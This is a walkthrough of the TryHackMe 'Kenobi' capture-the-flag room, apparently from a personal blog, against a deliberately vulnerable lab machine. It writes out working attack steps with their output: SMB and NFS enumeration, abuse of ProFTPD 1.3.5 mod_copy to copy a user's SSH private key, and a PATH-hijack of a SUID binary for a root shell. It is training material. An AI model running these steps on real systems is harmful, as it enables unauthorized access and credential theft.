---
layout: post
title: TryHackMe - Kenobi
---

Room: [Kenobi](https://tryhackme.com/room/kenobi)

## Deploy the vulnerable machine
### Scan the machine with nmap, how many ports are open?

```
kali@kali:~$ nmap -T4 -p- 10.10.54.61
Starting Nmap 7.80 ( https://nmap.org ) at 2020-11-30 22:03 EST            
Stats: 0:00:02 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
Connect Scan Timing: About 0.37% done                                      
Stats: 0:00:02 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
Connect Scan Timing: About 0.40% done                                      
Nmap scan report for 10.10.54.61                                           
Host is up (0.15s latency).                                                
Not shown: 65528 closed ports                                              
PORT      STATE SERVICE                                                    
21/tcp    open  ftp                                                        
22/tcp    open  ssh                                                        
80/tcp    open  http                                                       
111/tcp   open  rpcbind                                                    
139/tcp   open  netbios-ssn                                                
445/tcp   open  microsoft-ds                                               
2049/tcp  open  nfs                                                        
                                                                           
Nmap done: 1 IP address (1 host up) scanned in 668.36 seconds              
```

## Enumerating Samba for shares

Samba is the standard Windows interoperability suite of programs for Linux and Unix. It allows end users to access and use files, printers and other commonly shared resources on a companies intranet or internet. It's often referred to as a network file system.

Samba is based on the common client/server protocol of Server Message Block (SMB). SMB is developed only for Windows, without Samba, other computer platforms would be isolated from Windows machines, even if they were part of the same network.

Using nmap we can enumerate a machine for SMB shares.

Nmap has the ability to run to automate a wide variety of networking tasks. There is a script to enumerate shares!

`nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse 10.10.101.116`

SMB has two ports, 445 and 139.

<p align="center">
<img src="https://i.imgur.com/bkgVNy3.png">
</p>
 
### Using the nmap command above, how many shares have been found?

```
PORT    STATE SERVICE                                                                             
445/tcp open  microsoft-ds                                                                                                
Host script results:
| smb-enum-shares: 
|   account_used: guest
|   \\10.10.101.116\IPC$: 
|     Type: STYPE_IPC_HIDDEN
|     Comment: IPC Service (kenobi server (Samba, Ubuntu))
|     Users: 1
|     Max Users: <unlimited>
|     Path: C:\tmp
|     Anonymous access: READ/WRITE
|     Current user access: READ/WRITE
|   \\10.10.101.116\anonymous: 
|     Type: STYPE_DISKTREE
|     Comment: 
|     Users: 0
|     Max Users: <unlimited>
|     Path: C:\home\kenobi\share
|     Anonymous access: READ/WRITE
|     Current user access: READ/WRITE
|   \\10.10.101.116\print$: 
|     Type: STYPE_DISKTREE
|     Comment: Printer Drivers
|     Users: 0
|     Max Users: <unlimited>
|     Path: C:\var\lib\samba\printers
|     Anonymous access: <none>
|_    Current user access: <none>
|_smb-enum-users: ERROR: Script execution failed (use -d to debug)
```

### Using your machine, connect to the machines network share. Once you're connected, list the files on the share. What is the file can you see?

```
kali@kali:~$ smbclient //10.10.101.116/anonymous
Enter WORKGROUP\kali's password: 
smb: \> ls
  .                                   D        0  Wed Sep  4 06:49:09 2019
  ..                                  D        0  Wed Sep  4 06:56:07 2019
  log.txt                             N    12237  Wed Sep  4 06:49:09 2019

                9204224 blocks of size 1024. 6877116 blocks available
```

### Recursively download the SMB share.

```
kali@kali:~$ smbget -R smb://10.10.101.116/anonymous
Password for [kali] connecting to //anonymous/10.10.101.116: 
Using workgroup WORKGROUP, user kali
smb://10.10.101.116/anonymous/log.txt                                                                                     
Downloaded 11.95kB in 4 seconds
kali@kali:~$ cat log.txt 
Generating public/private rsa key pair.
Enter file in which to save the key (/home/kenobi/.ssh/id_rsa): 
Created directory '/home/kenobi/.ssh'.
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in /home/kenobi/.ssh/id_rsa.
Your public key has been saved in /home/kenobi/.ssh/id_rsa.pub.
The key fingerprint is:
SHA256:C17GWSl/v7KlUZrOwWxSyk+F7gYhVzsbfqkCIkr2d7Q kenobi@kenobi
The key's randomart image is:
+---[RSA 2048]----+
|                 |
|           ..    |
|        . o. .   |
|       ..=o +.   |
|      . So.o++o. |
|  o ...+oo.Bo*o  |
| o o ..o.o+.@oo  |
|  . . . E .O+= . |
|     . .   oBo.  |
+----[SHA256]-----+

# This is a basic ProFTPD configuration file (rename it to 
# 'proftpd.conf' for actual use.  It establishes a single server
# and a single anonymous login.  It assumes that you have a user/group
# "nobody" and "ftp" for normal operation and anon.

ServerName                      "ProFTPD Default Installation"
ServerType                      standalone
DefaultServer                   on

# Port 21 is the standard FTP port.
Port                            21
[...]
```


Your earlier nmap port scan will have shown port 111 running the service rpcbind. This is just an server that converts remote procedure call (RPC) program number into universal addresses. When an RPC service is started, it tells rpcbind the address at which it is listening and the RPC program number its prepared to serve. 

In our case, port 111 is access to a network file system. Lets use nmap to enumerate this.

`nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount 10.10.101.116`

### What mount can we see?

```
kali@kali:~$ nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount 10.10.101.116
Starting Nmap 7.80 ( https://nmap.org ) at 2020-11-30 23:58 EST
Stats: 0:00:00 elapsed; 0 hosts completed (0 up), 1 undergoing Ping Scan
Ping Scan Timing: About 100.00% done; ETC: 23:58 (0:00:00 remaining)
Nmap scan report for 10.10.101.116
Host is up (0.15s latency).

PORT    STATE SERVICE
111/tcp open  rpcbind
| nfs-showmount: 
|_  /var *

Nmap done: 1 IP address (1 host up) scanned in 1.48 seconds
```

## Gain initial access with ProFtpd

ProFtpd is a free and open-source FTP server, compatible with Unix and Windows systems. Its also been vulnerable in the past software versions.

Let's get the version of ProFtpd. Use netcat to connect to the machine on the FTP port.

## What is the version?

```
kali@kali:~$ nc 10.10.101.116 21
220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) [10.10.101.116]
```

We can use searchsploit to find exploits for a particular software version.

Searchsploit is basically just a command line search tool for exploit-db.com.

### How many exploits are there for the ProFTPd running?

```
kali@kali:~$ searchsploit ProFtpd 1.3.5
---------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                          |  Path
---------------------------------------------------------------------------------------- ---------------------------------
ProFTPd 1.3.5 - 'mod_copy' Command Execution (Metasploit)                               | linux/remote/37262.rb
ProFTPd 1.3.5 - 'mod_copy' Remote Command Execution                                     | linux/remote/36803.py
ProFTPd 1.3.5 - File Copy                                                               | linux/remote/36742.txt
---------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

The mod_copy module implements SITE CPFR and SITE CPTO commands, which can be used to copy files/directories from one place to another on the server. Any unauthenticated client can leverage these commands to copy files from any part of the filesystem to a chosen destination.

We know that the FTP service is running as the Kenobi user (from the file on the share) and an ssh key is generated for that user. 

```
kali@kali:~/THM/kenobi$ nc 10.10.101.116 21
220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) [10.10.101.116]
SITE CPFR /home/kenobi/.ssh/id_rsa
350 File or directory exists, ready for destination name
SITE CPTO /var/tmp/id_rsa
250 Copy successful
```

We knew that the /var directory was a mount we could see (task 2, question 4). So we've now moved Kenobi's private key to the /var/tmp directory.

### Mount the /var/tmp directory to our machine, use the SSH key moved there to gain access to the server, and get the user flag.

```
kali@kali:~/THM/kenobi$ sudo mkdir /mnt/kenobiNFS
kali@kali:~/THM/kenobi$ sudo mount 10.10.101.116:/var /mnt/kenobiNFS
kali@kali:~/THM/kenobi$ ls -la /mnt/kenobiNFS/
total 56
drwxr-xr-x 14 root root    4096 Sep  4  2019 .
drwxr-xr-x  3 root root    4096 Dec  1 00:30 ..
drwxr-xr-x  2 root root    4096 Sep  4  2019 backups
drwxr-xr-x  9 root root    4096 Sep  4  2019 cache
drwxrwxrwt  2 root root    4096 Sep  4  2019 crash
drwxr-xr-x 40 root root    4096 Sep  4  2019 lib
drwxrwsr-x  2 root staff   4096 Apr 12  2016 local
lrwxrwxrwx  1 root root       9 Sep  4  2019 lock -> /run/lock
drwxrwxr-x 10 root crontab 4096 Sep  4  2019 log
drwxrwsr-x  2 root mail    4096 Feb 26  2019 mail
drwxr-xr-x  2 root root    4096 Feb 26  2019 opt
lrwxrwxrwx  1 root root       4 Sep  4  2019 run -> /run
drwxr-xr-x  2 root root    4096 Jan 29  2019 snap
drwxr-xr-x  5 root root    4096 Sep  4  2019 spool
drwxrwxrwt  6 root root    4096 Dec  1 00:27 tmp
drwxr-xr-x  3 root root    4096 Sep  4  2019 www
kali@kali:~/THM/kenobi$ cp /mnt/kenobiNFS/tmp/id_rsa .
kali@kali:~/THM/kenobi$ chmod 600 id_rsa 
kali@kali:~/THM/kenobi$ ssh -i id_rsa kenobi@10.10.101.116
load pubkey "id_rsa": invalid format
The authenticity of host '10.10.101.116 (10.10.101.116)' can't be established.
ECDSA key fingerprint is SHA256:uUzATQRA9mwUNjGY6h0B/wjpaZXJasCPBY30BvtMsPI.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.101.116' (ECDSA) to the list of known hosts.
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.8.0-58-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

103 packages can be updated.
65 updates are security updates.


Last login: Wed Sep  4 07:10:15 2019 from 192.168.1.147
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

kenobi@kenobi:~$ cat user.txt 
[censored]
```

## Privilege Escalation with Path Variable Manipulation


| Permission |                            On Files                            |                       On Directories                      |
|:----------:|:--------------------------------------------------------------:|:---------------------------------------------------------:|
|  SUID Bit  |    User executes the file with permissions of the file owner   |                             -                             |
|  SGID Bit  | User executes the file with the permission of the group owner. |    File created in directory gets the same group owner.   |
| Sticky Bit |                           No meaning                           | Users are prevented from deleting files from other users. |

SUID bits can be dangerous, some binaries such as passwd need to be run with elevated privileges (as its resetting your password on the system), however other custom files could that have the SUID bit can lead to all sorts of issues.

To search the a system for these type of files run the following: `find / -perm -u=s -type f 2>/dev/null`

### What file looks particularly out of the ordinary? 

```
kenobi@kenobi:~$ find / -perm -u=s -type f 2>/dev/null
/sbin/mount.nfs
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/snapd/snap-confine
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/bin/chfn
/usr/bin/newgidmap
/usr/bin/pkexec
/usr/bin/passwd
/usr/bin/newuidmap
/usr/bin/gpasswd
/usr/bin/menu	<--
/usr/bin/sudo
/usr/bin/chsh
/usr/bin/at
/usr/bin/newgrp
/bin/umount
/bin/fusermount
/bin/mount
/bin/ping
/bin/su
/bin/ping6
```

### Run the binary, how many options appear?

```
kenobi@kenobi:~$ menu

***************************************
1. status check
2. kernel version
3. ifconfig
** Enter your choice :
[...]
```

### Use Path Variable Manipulation to get the root flag.

```
kenobi@kenobi:~$ strings /usr/bin/menu
/lib64/ld-linux-x86-64.so.2
libc.so.6
setuid
[...]
***************************************
1. status check
2. kernel version
3. ifconfig
** Enter your choice :
curl -I localhost
uname -r
ifconfig
 Invalid choice
[...]
```

The binary is running hardcoded commands without a full path (e.g. not using /usr/bin/curl or /usr/bin/uname). As this file runs as the root users privileges, we can manipulate our path gain a root shell.

```
kenobi@kenobi:~$ cd /tmp
kenobi@kenobi:/tmp$ echo /bin/sh > curl
kenobi@kenobi:/tmp$ chmod 777 curl
kenobi@kenobi:/tmp$ export PATH=/tmp:$PATH
kenobi@kenobi:/tmp$ /usr/bin/menu

***************************************
1. status check
2. kernel version
3. ifconfig
** Enter your choice :1
# whoami
root
# id
uid=0(root) gid=1000(kenobi) groups=1000(kenobi),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd),113(lpadmin),114(sambashare)
# cat /root/root.txt
[censored]
```

## Cleanup

```
kali@kali:~/THM/kenobi$ sudo umount /mnt/kenobiNFS/ 
kali@kali:~/THM/kenobi$ sudo rmdir /mnt/kenobiNFS/
```
